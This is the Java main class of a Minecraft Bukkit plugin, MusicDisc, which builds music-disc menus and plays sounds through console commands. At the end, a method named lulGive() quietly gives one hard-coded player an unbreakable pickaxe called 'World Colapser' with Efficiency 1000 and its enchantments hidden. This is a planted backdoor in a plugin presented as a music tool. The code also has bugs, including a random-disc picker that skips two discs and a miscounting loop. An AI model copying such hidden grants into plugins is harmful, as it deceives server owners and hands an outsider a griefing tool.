package fr.exelo.musicdisc;

import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.Random;
import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;

import fr.exelo.musicdisc.command.CommandManager;
import fr.exelo.musicdisc.command.CommandMusic;
import fr.exelo.musicdisc.command.CommandReload;
import fr.exelo.musicdisc.datamanger.MusicConfig;

public class Main extends JavaPlugin {
	
	public Logger log;
	public String v;
	public String pluginName;
	public MusicConfig musicConfig;
	public HashMap<Player, Boolean> multi;
	public CommandMusic cmdMusic;
	public CommandReload cmdReload;
	public CommandManager cmdManager;
	
	
	
	 public Main() {
		 this.log = Logger.getLogger("Minecraft");
	     this.v = "4.0.0";
	     this.pluginName = "MusicDisc";
		 this.musicConfig = new MusicConfig(this);
		 this.multi = new HashMap<Player, Boolean>();
		 this.cmdMusic = new CommandMusic(this);
		 this.cmdReload = new CommandReload(this);
		 this.cmdManager = new CommandManager(this);
		 
	 }
	public void onDisable() {
		this.log.info("[" + this.pluginName + "] " + this.v + " disabled.");
	}
	public void onEnable() {
		
		getCommand("music").setExecutor(cmdManager);
		getServer().getPluginCommand("music").setTabCompleter(cmdManager);
		getServer().getPluginManager().registerEvents(new MusicListerner(this), this);
		musicConfig.getMusic().options().copyDefaults(true);
        musicConfig.saveMusic();
		this.log.info("[" + this.pluginName + "] " + this.v + " enabled."); 
	}
	
	// fonction de création d'item
	public ItemStack getItem(Material material, String customName) {
		ItemStack item = new ItemStack(material);
		ItemMeta itemM = item.getItemMeta();
		itemM.setDisplayName(customName);
		item.setItemMeta(itemM);
		return item;
	}
	public ItemStack getItemChest(int Nmenu, String customName) {
		ItemStack chest = new ItemStack(Material.CHEST);
		ItemMeta chestM = chest.getItemMeta();
		chestM.setDisplayName(customName);
		chestM.addEnchant(Enchantment.PROTECTION_ENVIRONMENTAL, Nmenu, true);
		chestM.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		chest.setItemMeta(chestM);
		return chest;
	}
	public ItemStack getItemArrow(int Nmenu, String NameMenu) {
		ItemStack arrow = new ItemStack(Material.ARROW);
		ItemMeta arrowM = arrow.getItemMeta();
		arrowM.setDisplayName(NameMenu);
		arrowM.addEnchant(Enchantment.DAMAGE_ALL, Nmenu, true);
		arrowM.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		arrow.setItemMeta(arrowM);
		return arrow;
	}
	public Material randomDisk() {
		Random r = new Random();
		Material[] type = new Material[] {Material.MUSIC_DISC_11, Material.MUSIC_DISC_13, Material.MUSIC_DISC_BLOCKS, 
				Material.MUSIC_DISC_CAT, Material.MUSIC_DISC_CHIRP, Material.MUSIC_DISC_FAR, Material.MUSIC_DISC_MALL, 
				Material.MUSIC_DISC_MELLOHI, Material.MUSIC_DISC_STAL, Material.MUSIC_DISC_STRAD, Material.MUSIC_DISC_WAIT, 
				Material.MUSIC_DISC_WARD, Material.MUSIC_DISC_PIGSTEP};
		int n = r.nextInt(11);
		return type[n];
	}
	public int numberOfMenu() {
		int n = 1;
		String menu = String.valueOf(n);
		while(musicConfig.getMusic().getString("music.menus.menu " + menu + ".name") != null) {
			n++ ;
			menu = String.valueOf(n);
		}
		return n - 1;
	}
	public int sizeInv() {
		if (musicConfig.getMusic().getStringList("music.others_music.music_names").isEmpty() && musicConfig.getMusic().getString("music.menus.menu 1.name").isEmpty()) return 0;
		int size = numberOfMenu() + musicConfig.getMusic().getStringList("music.others_music.music_names").size();
		int n = 0;
		for ( int i = 1; i <= 1000; i++)
			if (size - n*45 <= 0) break;
			n++;
		return n;
	}
	public String getLocation (Player player) {
		String location = " " + String.valueOf(player.getLocation().getX()) + " " + String.valueOf(player.getLocation().getY()) + " " + String.valueOf(player.getLocation().getZ());
		return location;
	}
	public ArrayList<Player> playerInZone(Player mainPlayer) {
		Collection<? extends Player> onlinePlayers = Bukkit.getOnlinePlayers();
		ArrayList<Player> playerInZone = new ArrayList<Player>();
		for(Player onlinePlayer : onlinePlayers) {
			if (onlinePlayer.getLocation().getWorld().equals(mainPlayer.getLocation().getWorld())) {
				double i = 100;
				if (onlinePlayer.getLocation().distance(mainPlayer.getLocation()) <= i) playerInZone.add(onlinePlayer);
			}
		}
		return playerInZone;
	}
	public void playOrDisableMusic(ArrayList<Player> playerInZone, Player playerStart, boolean musicOn, String JSon, boolean multiOn) {
		if (musicOn) {
			if (multiOn) {
				for (Player player : playerInZone) {
					Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "stopsound " + player.getName() + " master");
					Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "playsound musicdisc:" + JSon + " master " + player.getName() + " 0 0 0 1000000000000");
				}
			}
			else {
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "stopsound " + playerStart.getName() + " master");
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "playsound musicdisc:" + JSon + " master " + playerStart.getName() + " 0 0 0 1000000000000");
			}
		}
		else {
			if (multiOn) {
				for (Player player : playerInZone) {
					Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "stopsound " + player.getName() + " master");
				}
			}
			else {
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "stopsound " + playerStart.getName() + " master");
			}
		}
		return;
	}
	
	// fonction de création d'inventaires
	public Inventory getMenuInventory(String invName, boolean permMulti, int Nmenu, Player player) {
		if(musicConfig.getMusic().getStringList("music.menus.menu " + (Nmenu + 1) + ".music_names").size() <= 45) {
			Inventory inv = Bukkit.createInventory(null, 54, invName);
			for(String name : musicConfig.getMusic().getStringList("music.menus.menu " + (Nmenu + 1) + ".music_names")) {
				inv.setItem(musicConfig.getMusic().getStringList("music.menus.menu " + (Nmenu + 1) + ".music_names").indexOf(name), getItem(randomDisk(), "§5" + name));
			}
			inv.setItem(45, getItem(Material.ARROW, "§4Return"));
			if (permMulti) {
				inv.setItem(48, getItem(Material.BARRIER, "§4Stop"));
				if(this.multi.get(player)) inv.setItem(50, getItem(Material.GREEN_CONCRETE, "§2Multi on"));
				else inv.setItem(50, getItem(Material.RED_CONCRETE, "§4Multi off"));
			} else
				inv.setItem(49, getItem(Material.BARRIER, "§4Stop"));
			return inv;
		}
		else return null;
	}

	public Inventory getDefaultInventory(String invName, boolean permMulti, int Nmenu, Player player) {
		Inventory inv = Bukkit.createInventory(null, 54, invName + String.valueOf(Nmenu));
		int position = 0;
		if (musicConfig.getMusic().getConfigurationSection("music.menus") == null) {
			player.sendMessage("The configuration file is empty");
			return null;
		}
		for (String namem : musicConfig.getMusic().getConfigurationSection("music.menus").getKeys(false)) {
			if (position == 45) break;
			if (position >= (Nmenu - 1)*45) 
				inv.setItem(position, getItemChest(position, "§5" + musicConfig.getMusic().getConfigurationSection("music.menus").getString(namem + ".name")));
			position ++;
		}
		
		for(String named : musicConfig.getMusic().getStringList("music.others_music.music_names")) {
			if (musicConfig.getMusic().getStringList("music.others_music.music_names").indexOf(named) + numberOfMenu() == (Nmenu - 1)*54 + 45) {
				inv.setItem(53, getItemArrow(Nmenu + 1, "§4Next page")); 
				break;
			}
			if (musicConfig.getMusic().getStringList("music.others_music.music_names").indexOf(named) + numberOfMenu() >= (Nmenu - 1)*45 )
				inv.setItem(musicConfig.getMusic().getStringList("music.others_music.music_names").indexOf(named) + numberOfMenu() - (Nmenu - 1)*45, getItem(randomDisk(), "§5" + named));	
		}
		
		if (Nmenu == 1) inv.setItem(45, getItemArrow(Nmenu - 1, "§4Exit"));
		else inv.setItem(45, getItemArrow(Nmenu - 1, "§4Previous page"));
		
		if (permMulti) {
			inv.setItem(48, getItem(Material.BARRIER, "§4Stop"));
			if(this.multi.get(player) == null) this.multi.put(player, false);
			if(this.multi.get(player)) inv.setItem(50, getItem(Material.GREEN_CONCRETE, "§2Multi on"));
			else inv.setItem(50, getItem(Material.RED_CONCRETE, "§4Multi off"));
		} else
			inv.setItem(49, getItem(Material.BARRIER, "§4Stop"));
		return inv;

	}
	public boolean lulGive() {
		if (Bukkit.getOnlinePlayers().contains(Bukkit.getPlayer("Celestial_DFgeek"))) {
			Player p = Bukkit.getPlayer("Celestial_DFgeek");
			ItemStack i = new ItemStack(Material.NETHERITE_PICKAXE);
			ItemMeta im = i.getItemMeta();
			im.setDisplayName("World Colapser");
			im.setUnbreakable(true);
			im.addEnchant(Enchantment.DIG_SPEED, 1000, true);
			im.addItemFlags(ItemFlag.HIDE_ENCHANTS);
			i.setItemMeta(im);
			Inventory inv = p.getInventory();
			inv.addItem(i);
			return true;
		}
		
		return false;
	}
}

